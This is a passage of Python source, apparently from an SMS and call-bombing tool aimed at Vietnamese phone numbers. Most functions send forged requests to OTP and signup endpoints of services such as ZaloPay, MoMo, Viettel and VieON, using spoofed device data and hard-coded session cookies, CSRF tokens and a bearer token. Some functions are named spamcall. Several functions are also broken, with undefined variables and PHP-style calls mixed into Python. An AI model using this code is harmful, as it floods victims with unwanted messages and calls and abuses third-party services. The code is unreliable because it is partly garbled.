    response = requests.post("https://api.senmo.vn/api/user/send-one-time-password", headers={"Host": "api.senmo.vn","content-length": "23","sec-ch-ua": "\"Chromium\";v\u003d\"104\", \" Not A;Brand\";v\u003d\"99\", \"Google Chrome\";v\u003d\"104\"","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://senmo.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://senmo.vn/user/login","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"phone":"84"+phone[1:11]}))

def ZALOPAY(sdt):
    head = {
        "Host": "api.zalopay.vn",
        "x-platform": "NATIVE",
        "x-device-os": "ANDROID",
        "x-device-id": "690354367d96c358",
        "x-device-model": "Samsung SM-A217F",
        "x-app-version": "7.16.0",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36 ZaloPay Android / 9881",
        "x-density": "xhdpi",
        "authorization": "Bearer",
        "x-drsite": "off",
        "accept-encoding": "gzip"
    }
    
    url = "https://api.zalopay.vn/v2/account/phone/status?phonenumber=" + sdt
    get = json.loads(CURL("GET", url, None, head, False))
    token = get["data"]["sendotptoken"]
    data = '{"phonenumber":"' + sdt + '","sendotptoken":"' + token + '"}'
    url = "https://api.zalopay.vn/v2/account/otp"
    get = json.loads(CURL("POST", url, data, head, False))

def thantaioi(sdt):
    sdt = "84" + sdt
    sdt = "84" + sdt.replace("840", "")
    head = [
        "Host: api.thantaioi.vn",
        "accept-language: vi",
        "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type: application/json",
        "accept: */*",
        "origin: https://thantaioi.vn",
        "referer: https://thantaioi.vn/",
    ]
    data = '{"full_name":"Khang pro","first_name":"pro","last_name":"Khang","mobile_phone":"' + sdt + '","target_url":"caydenthan.vn/"}'
    get = json_decode(CURL("POST", "https://api.thantaioi.vn/api/user", data, head, False), True)
    token = get["token"]
    if token:
        head = [
            "Host: api.thantaioi.vn",
            "accept-language: vi",
            "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
            "content-type: application/json",
            "authorization: Bearer " + token,
            "accept: */*",
            "origin: https://thantaioi.vn",
            "referer: https://thantaioi.vn/",
        ]
        get = json_decode(CURL("GET", "https://api.thantaioi.vn/api/user/phone-confirmation-code", None, head, False), True)
    else:
        data = '{"phone":"' + sdt + '"}'
        get = json_decode(CURL("POST", "https://api.thantaioi.vn/api/user/send-one-time-password", data, head, False), True)

def CAYDENTHAN(sdt):
    sdt = "84" + sdt
    sdt = "84" + sdt.replace("840", "")
    head = [
        "Host: api.caydenthan.vn",
        "accept-language: vi",
        "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type: application/json",
        "accept: */*",
        "origin: https://caydenthan.vn",
        "referer: https://caydenthan.vn/",
    ]
    data = '{"full_name":"Khang pro","first_name":"pro","last_name":"Khang","mobile_phone":"' + sdt + '","target_url":"caydenthan.vn/"}'
    get = json_decode(CURL("POST", "https://api.caydenthan.vn/api/user", data, head, false), true)
    token = get["token"]
    if token:
        head = [
            "Host: api.caydenthan.vn",
            "accept-language: vi",
            "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
            "content-type: application/json",
            "authorization: Bearer " + token,
            "accept: */*",
            "origin: https://caydenthan.vn",
            "referer: https://caydenthan.vn/",
        ]
        get = json_decode(CURL("GET", "https://api.caydenthan.vn/api/user/phone-confirmation-code", None, head, false), true)
    else:
        data = '{"phone":"' + sdt + '"}'
        get = json_decode(CURL("POST", "https://api.caydenthan.vn/api/user/send-one-time-password", data, head, false), true)

def MONEYVEO(sdt):
    import requests
    import json
    def generateRandomString(length):
        import random
        import string
        letters = string.asciilowercase
        return ''.join(random.choice(letters) for i in range(length))
    
    headers = {
        "Host": "moneyveo.vn",
        "accept": "/",
        "x-requested-with": "XMLHttpRequest",
        "traceparent": "00-" + generateRandomString(len("c771ff34b940c30df615b678478fce28")) + "-" + generateRandomString(len("1e0ba42c6725b148")) + "-00",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "referer": "https://moneyveo.vn/vi/registernew/"
    }
    
    post = requests.post("https://moneyveo.vn/vi/registernew/sendsmsjson/", data=data, headers=headers)
    response = json.loads(post.content.decode('utf-8'))

def ONCREDIT(sdt):
    headers = {
        "Host": "oncredit.vn",
        "accept": "application/json, text/javascript, */*; q=0.01",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://oncredit.vn",
        "referer": "https://oncredit.vn/registration",
        "cookie": "SN5c8116d5e6183=3tv1o7ton9n12jtnug96f8d8ut;OnCreditid=643e0edf695496.07498174;fptoken7c6a6574-f011-4c9a-abdd-9894a102ccef=TGp96BSUW5IwMh0JgHeUd49rmhRq1triMmGzLzWzvCI=;GNUSERIDKEY=66bb4878-093a-4dfc-9f25-3ee94accd97a;GNSESSIONIDKEY=fd64cde4-6459-4ff0-8a68-7770bd9aa247"
    }
    post = requests.post("https://oncredit.vn/?ajax", data=data, headers=headers)
    response = json.loads(post.content.decode('utf-8'))

def MOMO(sdt):
    head = {
        "agentid": "undefined",
        "sessionkey": "",
        "userphone": "undefined",
        "authorization": "Bearer undefined",
        "msgtype": "CHECKUSERBEMSG",
        "Host": "api.momo.vn",
        "User-Agent": "okhttp/4.0.12",
        "appversion": "40122",
        "appcode": "4.0.12",
        "deviceos": "ANDROID"
    }
    data = {
        'user': sdt,
        'msgType': 'CHECKUSERBEMSG',
        'cmdId': microtime + '000000',
        'lang': 'vi',
        'time': microtime,
        'channel': 'APP',
        'appVer': '40122',
        'appCode': '4.0.12',
        'deviceOS': 'ANDROID',
        'buildNumber': 0,
        'appId': 'vn.momo.platform',
        'result': True,
        'errorCode': 0,
        'errorDesc': '',
        'momoMsg': {
            'class': 'mservice.backend.entity.msg.RegDeviceMsg',
            'number': sdt,
            'imei': imei,
            'cname': 'Vietnam',
            'ccode': '084',
            'device': "Oppo realme X Lite",
            'firmware': '23',
            'hardware': "RMX1851CN",
            'manufacture': "Oppo",
            'csp': '',
            'icc': '',
            'mcc': '452',
            'deviceos': 'Android',
            'secureid': sec
        },
        'extra': {
            'checkSum': ''
        }
    }
    GET = requests.post("https://api.momo.vn/backend/auth-app/public/CHECKUSERBEMSG", json=data, headers=head)
    head = {
        "agentid": "undefined",
        "sessionkey": "",
        "userphone": "undefined",
        "authorization": "Bearer undefined",
        "msgtype": "SENDOTPMSG",
        "Host": "api.momo.vn",
        "User-Agent": "okhttp/4.0.12",
        "appversion": "40122",
        "appcode": "4.0.12",
        "deviceos": "ANDROID"
    }
    data = {
        'user': sdt,
        'msgType': 'SENDOTPMSG',
        'cmdId': microtime + '000000',
        'lang': 'vi',
        'time': microtime,
        'channel': 'APP',
        'appVer': '40122',
        'appCode': '4.0.12',
        'deviceOS': 'ANDROID',
        'buildNumber': 0,
        'appId': 'vn.momo.platform',
        'result': True,
        'errorCode': 0,
        'errorDesc': '',
        'momoMsg': {
            'class': 'mservice.backend.entity.msg.RegDeviceMsg',
            'number': sdt,
            'imei': imei,
            'cname': 'Vietnam',
            'ccode': '084',
            'device': "Galaxy A21s",
            'firmware': '23',
            'hardware': "SM-A217F/DS",
            'manufacture': "Samsung",
            'csp': '',
            'icc': '',
            'mcc': '452',
            'deviceos': 'Android',
            'secureid': sec
        },
        'extra': {
            'action': 'SEND',
            'rkey': rkey,
            'AAID': aaid,
            'IDFA': '',
            'TOKEN': token,
            'SIMULATOR': '',
            'SECUREID': sec,
            'MODELID': "Oppo RMX1851",
            'isVoice': False,
            'REQUIREHASHSTRINGOTP': True,
            'checkSum': ''
        }
    }
    GET = requests.post("https://api.momo.vn/backend/auth-app/public/CHECKUSERBEMSG", json=data, headers=head)

def spamcall7(sdt):
    imei = generateImei()
    sec = getSECUREID()
    token = getTOKEN()
    rkey = generateRandom(20)
    aaid = generateImei()
    microtime = getmicrotime()
    head = [
        "agentid: undefined",
        "sessionkey:",
        "userphone: undefined",
        "authorization: Bearer undefined",
        "msgtype: CHECKUSERBEMSG",
        "Host: api.momo.vn",
        "User-Agent: okhttp/4.0.12",
        "appversion: 40122",
        "appcode: 4.0.12",
        "deviceos: ANDROID"
    ]
    data = {
        'user': sdt,
        'msgType': 'CHECKUSERBEMSG',
        'cmdId': str(microtime) + '000000',
        'lang': 'vi',
        'time': microtime,
        'channel': 'APP',
        'appVer': '40122',
        'appCode': '4.0.12',
        'deviceOS': 'ANDROID',
        'buildNumber': 0,
        'appId': 'vn.momo.platform',
        'result': True,
        'errorCode': 0,
        'errorDesc': '',
        'momoMsg': {
            'class': 'mservice.backend.entity.msg.RegDeviceMsg',
            'number': sdt,
            'imei': imei,
            'cname': 'Vietnam',
            'ccode': '084',
            'device': "Oppo realme X Lite",
            'firmware': '23',
            'hardware': "RMX1851CN",
            'manufacture': "Oppo",
            'csp': '',
            'icc': '',
            'mcc': '452',
            'deviceos': 'Android',
            'secureid': sec,
        },
        'extra': {
            'checkSum': '',
        },
    }
    GET = CURL("POST", "https://api.momo.vn/backend/auth-app/public/CHECKUSERBEMSG", json.dumps(data), head, False)


def SWIFT247(sdt):
    url = "https://api.swift247.vn/v1/checkphone"
    headers = {
        "Host": "api.swift247.vn",
        "content-length": "23",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "Android",
        "origin": "https://app.swift247.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://app.swift247.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    response = requests.post(url, headers=headers, data=json.dumps(postdata))
    
    if "OTPNOCONFIRMED" in response.text:
        url = "https://api.swift247.vn/v1/requestnewotp"
        response = requests.post(url, headers=headers, data=json.dumps(postdata))

def spamcall(sdt):
    headers = {
        "Host": "api.thantaioi.vn",
        "accept-language": "vi",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/json",
        "accept": "/",
        "origin": "https://thantaioi.vn",
        "referer": "https://thantaioi.vn/"
    }
    
    data = {
        "fullname": "Khang pro",
        "firstname": "pro",
        "lastname": "Khang",
        "mobilephone": sdt,
        "targeturl": "caydenthan.vn/"
    }
    
    response = requests.post("https://api.thantaioi.vn/api/user", data=json.dumps(data), headers=headers)
    get = json.loads(response.text)
    token = get["token"]
    
    if token:
        headers = {
            "Host": "api.thantaioi.vn",
            "accept-language": "vi",
            "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
            "content-type": "application/json",
            "authorization": "Bearer " + token,
            "accept": "*/*",
            "origin": "https://thantaioi.vn",
            "referer": "https://thantaioi.vn/"
        }
        
        response = requests.get("https://api.thantaioi.vn/api/user/phone-confirmation-code", headers=headers)

def KILO(sdt):
    headers = {
        "Host": "api.kilo.vn",
        "content-length": "54",
        "app-version": "1",
        "x-correlation-id": "d5afa9c6-73cb-47bf-ad42-0672912b725b",
        "sec-ch-ua-mobile": "?1",
        "authorization": "Bearer undefined",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "content-type": "application/json",
        "accept": "application/json",
        "i18next-language": "vi",
        "api-version": "2",
        "platform": "SELLERWEB",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://seller.kilo.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://seller.kilo.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    
    email = randomstring(6) + "@gmail.com" # Email đăng ký tài khoản
    data = json.dumps({"phone": sdt, "email": email})
    
    response = requests.post("https://api.kilo.vn/users/check-new-user", headers=headers, data=data)
    result = response.json()

def GAPO(sdt):
    headers = {
        "Host": "api.gapo.vn",
        "Content-Length": "31",
        "Content-Type": "application/json",
        "Sec-Ch-Ua-Mobile": "?1",
        "Authorization": "Bearer",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Sec-Ch-Ua-Platform": "\"Android\"",
        "Accept": "*/*",
        "Origin": "https://www.gapo.vn",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.gapo.vn/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    data = {
        "device_id": "30a1bfa0-533f-45e9-be60-b48fb8977df2",
        "phone_number": "+84-" + sdt[1:11],
        "otp_type": 0
    }
    
    response = requests.post("https://api.gapo.vn/auth/v2.0/signup", headers=headers, data=json.dumps(data))

#
def tv360(sdt):
  data = '{"msisdn":"phone"}'
  data = data.replace("phone",phone)
  head = {
    "Host":"m.tv360.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json"
  }
  rq = requests.post("https://m.tv360.vn/public/v1/auth/get-otp-login",data=data,headers=head).json()
#
def kingfood(sdt):
    headers = {
        'authority': 'api.onelife.vn',
        'accept': '*/*',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': '',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://kingfoodmart.com',
        'referer': 'https://kingfoodmart.com/',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    json_data = {
        'operationName': 'SendOTP',
        'variables': {
            'phone': phone,
        },
        'query': 'mutation SendOTP($phone: String!) {\n  sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) {\n    otpTrackingId\n    __typename\n  }\n}',
    }

    response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data)
#
def y360(sdt):
    cookies = {
        '_fbp': 'fb.1.1696598748603.1565913700',
        '_gcl_au': '1.1.913953200.1696598748.909437889.1696739113.1696739187',
        '_gid': 'GA1.2.1143037806.1696862139',
        '_gat_gtag_UA_211029013_1': '1',
        '_ga': 'GA1.1.1616124883.1696598748',
        '_ga_M7ZN50PQ1V': 'GS1.1.1696862138.3.1.1696862143.0.0.0',
        '_ga_BS2V9QEV6V': 'GS1.1.1696862139.3.1.1696862148.0.0.0',
    }

    headers = {
        'authority': 'y360.vn',
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        # 'cookie': '_fbp=fb.1.1696598748603.1565913700; _gcl_au=1.1.913953200.1696598748.909437889.1696739113.1696739187; _gid=GA1.2.1143037806.1696862139; _gat_gtag_UA_211029013_1=1; _ga=GA1.1.1616124883.1696598748; _ga_M7ZN50PQ1V=GS1.1.1696862138.3.1.1696862143.0.0.0; _ga_BS2V9QEV6V=GS1.1.1696862139.3.1.1696862148.0.0.0',
        'origin': 'https://y360.vn',
        'referer': 'https://y360.vn/hoc/register',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': phone,
    }

    response = requests.post('https://y360.vn/api/v1/user/register', cookies=cookies, headers=headers, json=json_data)
#
def mocha(sdt):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        # 'Content-Length': '0',
        'Origin': 'https://video.mocha.com.vn',
        'Referer': 'https://video.mocha.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'msisdn': phone,
        'languageCode': 'vi',
    }

    response = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers)
#
def viettel(sdt):
    cookies = {
        'laravel_session': 'zUAp4jSXFMXWS24ec5xFcs75ePe0Fag4qQgsUOA1',
        'redirectLogin': 'https://viettel.vn/',
        'XSRF-TOKEN': 'eyJpdiI6Imx3UDJxMVlWUXdCelp2OTA1WVN1RUE9PSIsInZhbHVlIjoiWnZXUXpTY2NnNnNrQ1B2MEN0cWN5eTZKZkdIZEprdStDZnplb0tHeStDZzBwbUNjcHVDb3o0XC9GbVZUU3M4R1kiLCJtYWMiOiI1YWFiNTNjNDFiNGM0NmZiOWZiZGQ2OTQ2YWVlNTU0MWYwOGQ0MTI1MTYwN2U0NWY5YTQ2ZjI0MmViMjMzNTI3In0%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=zUAp4jSXFMXWS24ec5xFcs75ePe0Fag4qQgsUOA1; redirectLogin=https://viettel.vn/; XSRF-TOKEN=eyJpdiI6Imx3UDJxMVlWUXdCelp2OTA1WVN1RUE9PSIsInZhbHVlIjoiWnZXUXpTY2NnNnNrQ1B2MEN0cWN5eTZKZkdIZEprdStDZnplb0tHeStDZzBwbUNjcHVDb3o0XC9GbVZUU3M4R1kiLCJtYWMiOiI1YWFiNTNjNDFiNGM0NmZiOWZiZGQ2OTQ2YWVlNTU0MWYwOGQ0MTI1MTYwN2U0NWY5YTQ2ZjI0MmViMjMzNTI3In0%3D',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'efjRYbmbopw0ggLuMX1D18VXhQRaWHMLzSNmRFvs',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6Imx3UDJxMVlWUXdCelp2OTA1WVN1RUE9PSIsInZhbHVlIjoiWnZXUXpTY2NnNnNrQ1B2MEN0cWN5eTZKZkdIZEprdStDZnplb0tHeStDZzBwbUNjcHVDb3o0XC9GbVZUU3M4R1kiLCJtYWMiOiI1YWFiNTNjNDFiNGM0NmZiOWZiZGQ2OTQ2YWVlNTU0MWYwOGQ0MTI1MTYwN2U0NWY5YTQ2ZjI0MmViMjMzNTI3In0=',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data) 
#
def myvt(sdt):
    cookies = {
        'laravel_session': '5FuyAsDCWgyuyu9vDq50Pb7GgEyWUdzg47NtEbQF',
        '__zi': '3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1eafoFxfZnrBmoB8-EoFKqp6BOB_wu5IGySqDpK.1',
        'XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
         'Cookie': 'laravel_session=5FuyAsDCWgyuyu9vDq50Pb7GgEyWUdzg47NtEbQF; __zi=3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1eafoFxfZnrBmoB8-EoFKqp6BOB_wu5IGySqDpK.1; XSRF-TOKEN=eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0%3D',
        'DNT': '1',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': '2n3Pu6sXr6yg5oNaUQ5vYHMuWknKR8onc4CeAJ1i',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0=',
        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': phone,
        'type': '',
    }

    response = requests.post('https://viettel.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data)

##
def dongpus(sdt):
    cookies = {
        '_gid': 'GA1.2.1794681595.1696862619',
        '_gat_UA-214880719-1': '1',
        '_ga_RRJDDZGPYG': 'GS1.1.1696862619.1.1.1696862632.47.0.0',
        '_ga': 'GA1.1.1910799487.1696862619',
    }

    headers = {
        'authority': 'api.dongplus.vn',
        'accept': '*/*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        # 'cookie': '_gid=GA1.2.1794681595.1696862619; _gat_UA-214880719-1=1; _ga_RRJDDZGPYG=GS1.1.1696862619.1.1.1696862632.47.0.0; _ga=GA1.1.1910799487.1696862619',
        'origin': 'https://dongplus.vn',
        'referer': 'https://dongplus.vn/user/login',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': phone,
    }

    response = requests.post(
        'https://api.dongplus.vn/api/user/send-one-time-password',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
#
def vieon(sdt):
    headers = {
        'authority': 'api.vieon.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2OTY5MTI1NzcsImp0aSI6IjI2ZjQ0MzA1M2UyYjE4MTY5NjFhZTk3ZjQ1ZDczNDE3IiwiYXVkIjoiIiwiaWF0IjoxNjk2NzM5Nzc3LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTY5NjczOTc3Niwic3ViIjoiYW5vbnltb3VzX2E1Mjg4MDUyMTg0Yzg2YjdiNTFmY2RiYmFhNTRhZDhlLTI1MTJlN2UzNTcwMjgwZjZiNTUyZWU5NGUzZjYwYzc0LTE2OTY3Mzk3NzciLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiYTUyODgwNTIxODRjODZiN2I1MWZjZGJiYWE1NGFkOGUtMjUxMmU3ZTM1NzAyODBmNmI1NTJlZTk0ZTNmNjBjNzQtMTY5NjczOTc3NyIsInVhIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExNy4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiZHQiOiJ3ZWIiLCJtdGgiOiJhbm9ueW1vdXNfbG9naW4iLCJtZCI6IldpbmRvd3MgMTAiLCJpc3ByZSI6MCwidmVyc2lvbiI6IiJ9.a68EyUReJUMpXkMmDcql32W7tVXvmE3GfcBnDQRMn0k',
        'content-type': 'application/json',
        'origin': 'https://vieon.vn',
        'referer': 'https://vieon.vn/auth/?destination=/&page=/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    params = {
        'platform': 'web',
        'ui': '012021',
    }

    json_data = {
        'username': phone,
        'country_code': 'VN',
        'model': 'Windows 10',
        'device_id': 'a5288052184c86b7b51fcdbbaa54ad8e',
        'device_name': 'Chrome/117',
        'device_type': 'desktop',
